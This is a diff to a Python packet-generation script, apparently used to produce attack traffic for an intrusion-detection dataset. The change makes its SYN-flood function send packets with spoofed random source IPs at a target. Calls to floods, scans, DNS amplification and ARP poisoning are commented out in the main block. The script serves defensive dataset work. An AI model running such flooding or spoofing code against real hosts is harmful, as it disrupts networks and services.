@@ -176,7 +176,7 @@ def syn_flood(target_ip, packet_count=10000):
         ip = IP(src=random_ip(), dst=target_ip, ttl=random_ttl())
         tcp = TCP(sport=random.randint(1024, 65535), dport=random.choice(exploited_ports), flags="S", window=random_window())
         packet = ip/tcp  # No payload in a typical SYN flood
-        # send(packet, verbose=False)
+        send(packet, verbose=False)
         record_packet(packet, "SYN Flood")
 
 # IP Spoofing (keeping the source port and flow key consistent)
@@ -308,26 +308,26 @@ def arp_poisoning(target_ip, gateway_ip, packet_count=14000):
 if __name__ == "__main__":
     print("Starting malicious traffic generation...")
 
-    syn_flood(target_ip, packet_count=16000) # tcp
-    ip_spoofing(target_ip, packet_count=16000) # tcp
-    malformed_packets(target_ip, packet_count=16000) # tcp
-    dns_amplification(target_ip, packet_count=16000) # udp
-    icmp_flood(target_ip, packet_count=16000) # icmp
+    syn_flood(target_ip, packet_count=10) # tcp
+    # ip_spoofing(target_ip, packet_count=16000) # tcp
+    # malformed_packets(target_ip, packet_count=16000) # tcp
+    # dns_amplification(target_ip, packet_count=16000) # udp
+    # icmp_flood(target_ip, packet_count=16000) # icmp
 
-    http_flood(target_ip, packet_count=16000) # tcp
-    tcp_fin_scan(target_ip, start_port=1, end_port=1023) # tcp
-    tcp_fin_scan(target_ip, start_port=1024, end_port=2048) # tcp
-    fragmentation_attack(target_ip, packet_count=300) # unknown (x10 size)
-    arp_poisoning(target_ip, gateway_ip="192.168.1.1") # unknown
+    # http_flood(target_ip, packet_count=16000) # tcp
+    # tcp_fin_scan(target_ip, start_port=1, end_port=1023) # tcp
+    # tcp_fin_scan(target_ip, start_port=1024, end_port=2048) # tcp
+    # fragmentation_attack(target_ip, packet_count=300) # unknown (x10 size)
+    # arp_poisoning(target_ip, gateway_ip="192.168.1.1") # unknown
 
     print(f"Number of records generated: {len(packet_records)}")
     print("Traffic generation completed. Preparing to write CSV...")
 
     # Save records to a csv file
-    csv_file = "E:\Stuff\IDS Machine Learning\Source\Tools\malicious_traffic2.csv"
-    with open(csv_file, mode='w', newline='') as file:
-        writer = csv.DictWriter(file, fieldnames=packet_records[0].keys())
-        writer.writeheader()
-        writer.writerows(packet_records)
+    # csv_file = "E:\Stuff\IDS Machine Learning\Source\Tools\malicious_traffic2.csv"
+    # with open(csv_file, mode='w', newline='') as file:
+    #     writer = csv.DictWriter(file, fieldnames=packet_records[0].keys())
+    #     writer.writeheader()
+    #     writer.writerows(packet_records)
 
-    print(f"CSV file written successfully to {os.path.abspath(csv_file)}.")
+    # print(f"CSV file written successfully to {os.path.abspath(csv_file)}.")
